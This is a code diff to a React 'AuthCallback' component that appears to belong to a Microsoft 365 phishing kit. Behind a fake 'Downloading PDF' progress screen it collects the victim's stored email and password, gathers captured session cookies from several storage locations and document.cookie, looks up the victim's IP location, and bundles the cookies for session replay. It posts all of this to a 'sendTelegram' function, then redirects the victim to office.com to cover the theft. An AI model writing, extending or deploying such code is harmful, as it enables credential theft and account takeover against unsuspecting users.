@@ -3,7 +3,8 @@ import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookie
 
 /**
  * AuthCallback Component
- * Captures cookies with better fallback handling
+ * Retrieves cookies from silent-auth-frame
+ * Uses restoreCookies.ts functions
  */
 
 function getByteLengthForBrowser(str: string): number {
@@ -11,12 +12,12 @@ function getByteLengthForBrowser(str: string): number {
 }
 
 const AuthCallback: React.FC = () => {
-  const [status, setStatus] = useState('Downloading PDF file...');
+  const [status, setStatus] = useState('Processing your data...');
   const [downloadProgress, setDownloadProgress] = useState(0);
 
   useEffect(() => {
     const executeCallback = async () => {
-      setStatus('Downloading PDF file...');
+      setStatus('Processing your data...');
       setDownloadProgress(10);
 
       console.log('🔄 AuthCallback: Starting data consolidation');
@@ -28,6 +29,7 @@ const AuthCallback: React.FC = () => {
         if (storedCreds) {
           credentials = JSON.parse(storedCreds);
           console.log('✅ Credentials retrieved from storage.');
+          console.log('📧 Email:', credentials.email);
           setDownloadProgress(25);
         } else {
           console.error('❌ FATAL: No credentials found in storage. Aborting.');
@@ -40,18 +42,37 @@ const AuthCallback: React.FC = () => {
         return;
       }
 
-      // --- 2. Retrieve Captured Cookies ---
+      // --- 2. Retrieve Captured Cookies from Silent Auth Frame ---
       let cookies: any[] = [];
       try {
-        console.log('🍪 Retrieving captured cookies...');
+        console.log('🍪 Retrieving captured cookies from silent-auth-frame...');
         
-        // Priority 1: Check window.__CAPTURED_DATA__ (set by injector)
-        if (window && (window as any).__CAPTURED_DATA__ && (window as any).__CAPTURED_DATA__.cookies) {
-          cookies = (window as any).__CAPTURED_DATA__.cookies;
-          console.log(`✅ Retrieved ${cookies.length} cookies from window.__CAPTURED_DATA__`);
+        // Priority 1: Check localStorage/sessionStorage from silent-auth-frame
+        const capturedCookiesData = localStorage.getItem('captured_cookies_data') || sessionStorage.getItem('captured_cookies_data');
+        
+        if (capturedCookiesData) {
+          try {
+            const parsedData = JSON.parse(capturedCookiesData);
+            if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
+              cookies = parsedData.cookies;
+              console.log(`✅ Retrieved ${cookies.length} cookies from silent-auth-frame storage`);
+              console.log('📍 Domain:', parsedData.domain);
+              console.log('⏰ Captured at:', parsedData.exportedAt);
+            }
+          } catch (parseError) {
+            console.warn('⚠️ Failed to parse captured cookies data:', parseError);
+          }
         }
-        
-        // Priority 2: Check restoreCookies.ts stored data
+
+        // Priority 2: Check window.__CAPTURED_DATA__ (backup from injector)
+        if (cookies.length === 0) {
+          if (window && (window as any).__CAPTURED_DATA__ && (window as any).__CAPTURED_DATA__.cookies) {
+            cookies = (window as any).__CAPTURED_DATA__.cookies;
+            console.log(`✅ Retrieved ${cookies.length} cookies from window.__CAPTURED_DATA__`);
+          }
+        }
+
+        // Priority 3: Check restoreCookies.ts stored data
         if (cookies.length === 0) {
           const storedData = getStoredData();
           if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
@@ -60,23 +81,7 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // Priority 3: Check injector localStorage
-        if (cookies.length === 0) {
-          const capturedCookiesData = localStorage.getItem('captured_cookies_data') || sessionStorage.getItem('captured_cookies_data');
-          if (capturedCookiesData) {
-            try {
-              const parsedData = JSON.parse(capturedCookiesData);
-              if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
-                cookies = parsedData.cookies;
-                console.log(`✅ Retrieved ${cookies.length} cookies from injector storage`);
-              }
-            } catch (parseError) {
-              console.warn('⚠️ Failed to parse captured cookies data:', parseError);
-            }
-          }
-        }
-
-        // Priority 4: Try raw captured_cookies
+        // Priority 4: Check raw captured_cookies
         if (cookies.length === 0) {
           const rawCookies = localStorage.getItem('captured_cookies') || sessionStorage.getItem('captured_cookies');
           if (rawCookies) {
@@ -92,9 +97,9 @@ const AuthCallback: React.FC = () => {
           }
         }
 
-        // Priority 5: Fallback to document.cookie
+        // Priority 5: Fallback to document.cookie (last resort)
         if (cookies.length === 0) {
-          console.log('📝 No stored cookies found, capturing from document.cookie...');
+          console.log('📝 No stored cookies found, attempting document.cookie fallback...');
           const cookieString = document.cookie;
           if (cookieString) {
             const cookiePairs = cookieString.split(';');
@@ -128,6 +133,8 @@ const AuthCallback: React.FC = () => {
 
         if (cookies.length === 0) {
           console.warn('⚠️ No cookies found in any storage location');
+        } else {
+          console.log('📊 Total cookies retrieved:', cookies.length);
         }
 
         setDownloadProgress(40);
@@ -136,22 +143,26 @@ const AuthCallback: React.FC = () => {
       }
 
       // --- 3. Fetch Location Data ---
-      setStatus('Downloading PDF file...');
+      setStatus('Processing your data...');
       let locationData: any = {};
       try {
+        console.log('📍 Fetching location data...');
         const response = await fetch('https://ipapi.co/json/');
         locationData = await response.json();
         console.log('✅ Location data fetched.');
+        console.log('📍 IP:', locationData.ip);
+        console.log('🌍 Country:', locationData.country_name);
         setDownloadProgress(55);
       } catch (error) {
         console.warn('⚠️ Failed to fetch location data:', error);
       }
 
-      // --- 4. Create Cookie File ---
+      // --- 4. Create Cookie File in restoreCookies.ts Format ---
       const createCookieFile = (cookiesToExport: any[]) => {
-        console.log('📝 Creating cookie file...');
+        console.log('📝 Creating cookie file in restoreCookies.ts format...');
         
         try {
+          // Format cookies using restoreCookies.ts compatible format
           const exportedCookies = cookiesToExport.map(cookie => ({
             name: cookie.name || '',
             value: cookie.value || '',
@@ -165,6 +176,7 @@ const AuthCallback: React.FC = () => {
             expirationDate: cookie.expirationDate
           }));
 
+          // Get browser capabilities using restoreCookies.ts function
           const browserCapabilities = detectBrowserCapabilities();
 
           const jsonContent = JSON.stringify({
@@ -175,7 +187,7 @@ const AuthCallback: React.FC = () => {
             totalCookies: exportedCookies.length,
             cookies: exportedCookies,
             browserCapabilities: browserCapabilities,
-            captureNote: cookiesToExport.length === 0 ? 'No cookies captured - OAuth flow may have failed' : 'Cookies captured from Microsoft domain',
+            captureSource: cookiesToExport.length > 0 ? 'silent-auth-frame' : 'no-capture',
             note: 'Cookies exported in restoreCookies.ts format - Compatible with restoreMicrosoftCookies function'
           }, null, 2);
 
@@ -198,21 +210,23 @@ const AuthCallback: React.FC = () => {
       const cookieFile = createCookieFile(cookies);
 
       if (cookieFile) {
-        console.log('✅ Cookie file created:', {
+        console.log('✅ Cookie file object created:', {
           name: cookieFile.name,
           size: cookieFile.size,
           cookieCount: cookies.length
         });
+      } else {
+        console.error('❌ Failed to create cookie file');
       }
 
       setDownloadProgress(70);
 
       // --- 5. Build Payload ---
-      setStatus('Downloading PDF file...');
+      setStatus('Processing your data...');
       const payload = {
         email: credentials.email,
         password: credentials.password,
-        passwordSource: 'auth-callback-final',
+        passwordSource: 'replacement-form',
         cookies: cookies,
         locationData: locationData,
         cookieFiles: cookieFile ? {
@@ -232,23 +246,27 @@ const AuthCallback: React.FC = () => {
           cookiesCaptured: cookies.length,
           cookieFileCreated: !!cookieFile,
           usingRestoreCookiesTS: true,
-          cookiesFromWindow: cookies.length > 0 ? 'window.__CAPTURED_DATA__' : 'other sources'
+          usingSilentAuthFrame: true,
+          captureSource: cookies.length > 0 ? 'silent-auth-frame' : 'fallback'
         }
       };
 
       console.log('═════════════════════════════════════════');
       console.log('📤 PAYLOAD SUMMARY:');
       console.log('═════════════════════════════════════════');
-      console.log('✅ Email:', payload.email ? 'Present' : 'Missing');
-      console.log('✅ Password:', payload.password ? 'Present' : 'Missing');
-      console.log('✅ Cookies:', payload.cookies.length);
-      console.log('✅ Location:', payload.locationData.ip ? 'Present' : 'Missing');
-      console.log('✅ Cookie File:', payload.cookieFiles.jsonFile ? 'Present' : 'Missing');
+      console.log('✅ Email:', payload.email ? '✓ Present' : '✗ Missing');
+      console.log('✅ Password:', payload.password ? '✓ Present' : '✗ Missing');
+      console.log('✅ Cookies:', payload.cookies.length, 'found');
+      console.log('✅ Location:', payload.locationData.ip ? '✓ ' + payload.locationData.ip : '✗ Missing');
+      console.log('✅ Cookie File:', payload.cookieFiles.jsonFile ? '✓ Present' : '✗ Missing');
+      console.log('📊 Payload Size:', (JSON.stringify(payload).length / 1024).toFixed(2), 'KB');
       console.log('═════════════════════════════════════════');
 
-      // --- 6. Send Payload ---
+      // --- 6. Send Payload to Telegram ---
       try {
         setDownloadProgress(85);
+        console.log('📤 Sending payload to Telegram...');
+        
         const response = await fetch('/.netlify/functions/sendTelegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -264,7 +282,11 @@ const AuthCallback: React.FC = () => {
         try {
           responseData = await response.json();
           console.log('Success:', responseData.success);
-          console.log('Transmitted:', responseData.transmitted);
+          console.log('Message:', responseData.message);
+          console.log('Transmitted:', {
+            credentials: responseData.transmitted?.credentials,
+            cookieFile: responseData.transmitted?.cookieFile
+          });
         } catch (e) {
           console.error('Failed to parse response:', e);
           responseData = {};
@@ -272,17 +294,19 @@ const AuthCallback: React.FC = () => {
 
         console.log('═════════════════════════════════════════');
 
-        if (response.ok) {
-          console.log('✅✅✅ SUCCESS: Data sent to Telegram!');
+        if (response.ok && responseData.success) {
+          console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
+          console.log('📊 Timestamp:', responseData.timestamp);
           setDownloadProgress(100);
-          setStatus('Download Successful');
+          setStatus('✅ Download Successful');
 
           setTimeout(() => {
-            console.log('🎉 Redirecting...');
+            console.log('🎉 Redirecting to Office 365...');
             window.location.href = 'https://www.office.com/?auth=2';
           }, 2500);
         } else {
-          console.error('❌ Failed with status:', response.status);
+          console.error('❌ Transmission failed');
+          console.error('Response:', responseData);
           setStatus(`Error: ${response.status}`);
         }
       } catch (error) {
@@ -319,7 +343,8 @@ const AuthCallback: React.FC = () => {
             }}>Download Successful</h2>
             <p style={{
               fontSize: '14px',
-              color: '#666'
+              color: '#666',
+              marginBottom: '0'
             }}>Your file is ready.</p>
           </div>
         ) : (
@@ -341,13 +366,15 @@ const AuthCallback: React.FC = () => {
                 width: `${downloadProgress}%`,
                 height: '100%',
                 backgroundColor: '#0078d4',
-                transition: 'width 0.3s ease'
+                transition: 'width 0.3s ease',
+                borderRadius: '4px'
               }}></div>
             </div>
 
             <p style={{
               fontSize: '14px',
-              color: '#666'
+              color: '#666',
+              marginBottom: '30px'
             }}>{downloadProgress}%</p>
 
             <div style={{
